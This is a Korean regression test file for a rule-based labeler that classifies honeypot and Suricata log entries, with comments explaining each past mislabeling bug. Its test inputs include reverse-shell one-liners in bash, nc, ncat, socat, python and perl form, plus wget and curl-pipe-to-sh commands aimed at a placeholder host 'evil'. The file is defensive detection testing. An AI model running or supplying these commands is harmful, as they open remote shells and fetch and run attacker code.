"""규칙 라벨러 회귀 테스트.

이 프로젝트에서 나온 결함은 대부분 예외를 던지지 않았다. 값이 조용히 틀리거나
화면이 조용히 비었다. 그래서 여기 있는 것은 "함수가 도는가"를 보는 테스트가
아니라, **실제로 겪은 실패 하나하나를 다시 일어나지 못하게 못 박는** 테스트다.
각 테스트에는 그 실패가 무엇이었는지 적어둔다.

    python3 -m pytest tests/ -q          (pytest 있으면)
    python3 tests/run.py                 (없으면)
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "dist"))

import rule_label  # noqa: E402


def 문서(**kw) -> dict:
    return kw


# ── 실패 1: suricata payload 를 아예 안 봤다 ──────────────────────────────
# 라벨러가 alert.category 만 보고 payload_printable 을 읽지 않아, 리버스셸
# 명령이 그대로 들어 있는 행이 Recon 으로 불렸다. 특징(feature)에는 리버스셸
# 신호가 잡히는데 라벨은 정찰이니, 모델은 서로 부정하는 것을 학습했다.
def test_suricata_payload_의_리버스셸이_침입으로_잡힌다():
    doc = 문서(
        type="suricata",
        alert={"category": "Attempted Information Leak"},
        payload_printable="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    )
    assert rule_label.label_from_doc(doc) == "Intrusion"


def test_payload_가_없으면_카테고리를_따른다():
    doc = 문서(type="suricata", alert={"category": "Attempted Information Leak"})
    assert rule_label.label_from_doc(doc) == "Recon"


# ── 실패 2: 경보 없는 suricata 행을 전부 정찰로 불렀다 ────────────────────
# 코퍼스의 73% 가 경보 없는 흐름 기록이었는데 전부 Recon 이 됐다. 정찰 클래스가
# 쓰레기통이 되어 모델이 배울 것이 남지 않았다.
def test_경보_없는_suricata_행은_Etc():
    assert rule_label.label_from_doc(문서(type="suricata")) == "Etc"
    assert rule_label.label_from_doc(문서(type="suricata", alert={})) == "Etc"


# ── 실패 3: network-scan 이 침입 목록에 들어 있었다 ───────────────────────
# 포트 스캔은 정찰이다. 침입으로 분류하면 위협 점수가 부풀고 LLM 게이트(≥70)를
# 통과해 추론 비용까지 쓴다.
def test_network_scan_은_정찰이다():
    doc = 문서(type="suricata", alert={"category": "Detection of a Network Scan"})
    assert rule_label.label_from_doc(doc) == "Recon"


# ── 실패 4: severity==2 면 무조건 Malware ────────────────────────────────
# suricata 의 severity 는 심각도지 유형이 아니다. 유형 판단에 쓰면 안 된다.
def test_severity_2_만으로는_악성코드가_되지_않는다():
    doc = 문서(type="suricata", alert={"category": "Attempted Information Leak", "severity": 2})
    assert rule_label.label_from_doc(doc) == "Recon"


# ── 322건 불일치의 정답 쪽: cowrie 리버스셸 ──────────────────────────────
# 모델은 이 경우를 학습한 적이 없어 Malware 라고 답한다(운영에서 322/322).
# 규칙이 기준선이므로 라벨은 Intrusion 으로 남아야 한다.
def test_cowrie_리버스셸은_침입이다():
    for cmd in (
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "nc -e /bin/sh 10.0.0.1 4444",
        "python -c 'import socket,os,pty;s=socket.socket()'",
    ):
        doc = 문서(type="cowrie", eventid="cowrie.command.input", input=cmd)
        assert rule_label.label_from_doc(doc) == "Intrusion", cmd


def test_cowrie_원격_다운로드는_악성코드다():
    doc = 문서(type="cowrie", eventid="cowrie.command.input", input="wget http://evil/x.sh")
    assert rule_label.label_from_doc(doc) == "Malware"


def test_cowrie_로그인_실패는_무차별_대입이다():
    doc = 문서(type="cowrie", eventid="cowrie.login.failed", username="root")
    assert rule_label.label_from_doc(doc) == "Brute Force"


# ── 내용이 허니팟 기본값을 이긴다 ────────────────────────────────────────
# elasticpot 은 기본이 Intrusion 이지만, 원격 다운로드가 보이면 그쪽이 더
# 구체적인 증거다.
def test_결정적_증거가_허니팟_기본값을_덮는다():
    doc = 문서(type="honeytrap", payload="curl http://evil/x.sh | sh")
    assert rule_label.label_from_doc(doc) == "Malware"


# ── is_attack 은 Normal 을 무해로 본다 ───────────────────────────────────
# Normal 은 NSL-KDD 공개 데이터에서 온 행이다. 공격으로 세면 통계가 부풀어진다.
def test_Normal_과_Etc_는_공격이_아니다():
    assert rule_label.is_attack("Normal") == 0
    assert rule_label.is_attack("Etc") == 0
    assert rule_label.is_attack("Intrusion") == 1


# ── 빈 문서에도 예외를 던지지 않는다 ─────────────────────────────────────
# 라벨러가 예외를 던지면 그 폴링 주기 전체가 죽는다.
def test_빈_문서와_None_필드에도_죽지_않는다():
    assert rule_label.label_from_doc({}) == "Etc"
    assert rule_label.label_from_doc({"type": None, "eventid": None, "input": None}) == "Etc"


# ── 리버스셸 탐지 확장 (테스트가 먼저 잡아낸 공백) ───────────────────────
# 최초 목록은 ("bash -i", "/dev/tcp", "nc -e", "mkfifo", "ncat") 뿐이라
# 스크립트 언어 계열을 통째로 놓쳤다. wget/curl 도 없으니 cowrie 분기의
# 마지막 줄로 떨어져 **Recon** 이 됐다 — 침입이 정찰로 기록되는 것이다.
def test_스크립트_언어_리버스셸도_침입이다():
    사례 = [
        "python -c 'import socket,os,pty;s=socket.socket()'",
        "python3 -c \"import socket,subprocess;s=socket.socket()\"",
        "perl -e 'use Socket;$i=\"10.0.0.1\";socket(S,PF_INET,SOCK_STREAM,0)'",
        "socat exec:'bash -li',pty,stderr tcp:10.0.0.1:4444",
        "ncat -c /bin/bash 10.0.0.1 4444",
    ]
    for cmd in 사례:
        doc = 문서(type="cowrie", eventid="cowrie.command.input", input=cmd)
        assert rule_label.label_from_doc(doc) == "Intrusion", cmd


# 탐지를 넓히면 오탐이 따라온다. 아래는 **침입이 아니어야** 한다.
# `socket` 이라는 낱말 하나로 걸리면 평범한 정찰·조회가 전부 침입이 된다.
def test_평범한_명령은_리버스셸로_오인되지_않는다():
    사례 = [
        ("ls -la /var/log", "Recon"),
        ("cat /etc/passwd", "Recon"),
        ("python -c 'print(1+1)'", "Recon"),
        ("netstat -an | grep socket", "Recon"),
        ("uname -a", "Recon"),
    ]
    for cmd, 기대 in 사례:
        doc = 문서(type="cowrie", eventid="cowrie.command.input", input=cmd)
        assert rule_label.label_from_doc(doc) == 기대, cmd


# ── 판단이 한 곳에 모여 있는가 ───────────────────────────────────────────
# 이전에는 공통 판정·cowrie 분기·기본 폴백 세 군데가 각자 판단해서, 규칙을
# 고치면 허니팟에 따라 답이 갈렸다. 같은 명령은 어디서 들어와도 같아야 한다.
def test_같은_리버스셸은_허니팟이_달라도_같게_분류된다():
    cmd = "python -c 'import socket,os,pty;s=socket.socket()'"
    라벨들 = {
        rule_label.label_from_doc(문서(type="cowrie", eventid="cowrie.command.input", input=cmd)),
        rule_label.label_from_doc(문서(type="honeytrap", payload=cmd)),
        rule_label.label_from_doc(문서(type="snare", message=cmd)),
        rule_label.label_from_doc(문서(type="알수없는허니팟", command=cmd)),
    }
    assert 라벨들 == {"Intrusion"}, 라벨들
